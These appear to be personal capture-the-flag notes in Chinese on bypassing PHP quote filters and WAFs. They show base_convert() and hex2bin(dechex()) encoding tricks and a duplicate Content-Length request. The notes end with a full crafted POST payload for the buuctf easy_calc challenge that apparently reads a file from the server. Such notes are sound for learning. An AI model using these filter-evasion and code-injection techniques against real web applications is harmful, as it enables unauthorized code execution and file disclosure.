# 绕过过滤

## 要输入字符串，但过滤了单双引号

base_convert()绕过：base_convert(string $number,int $frombase,int $ tobase)  
高于十进制的数字用字母a-z表示。36进制下可包含a-z  

```php
php > echo base_convert("phpinfo",36,10);
55490343972
php > echo base_convert(55490343972,10,36);
phpinfo
```

特殊符号构造：利用`hex2bin(dechex())`,dechex() 把十进制转为十六进制，hex2bin() 把十六进制值字符串转换为 ASCII 字符。  

> hex2bin(dechex(47)) -> /  
hex2bin(dechex(46)) -> .  
hex2bin(dechex(42)) -> *  
hex2bin(dechex(95)) -> _

用`echo base_convert(bin2hex('*'),16,10);`在php解释器`php -a`里自己构造十进制数字。  
可以哪天写个脚本搞一下  

## 使用畸形的HTTP请求（比如两个Content-Length）可绕WAF

具体我也不知道咋回事

## buuctf easy_calc

为什么有这个点？（dechex47和base_convert之间）

```
POST /calc.php?num=base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36)) HTTP/1.1
Host: node3.buuoj.cn:28348
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Content-Length: 7
Content-Length: 7
Referer: http://node3.buuoj.cn:28348/

num=111
```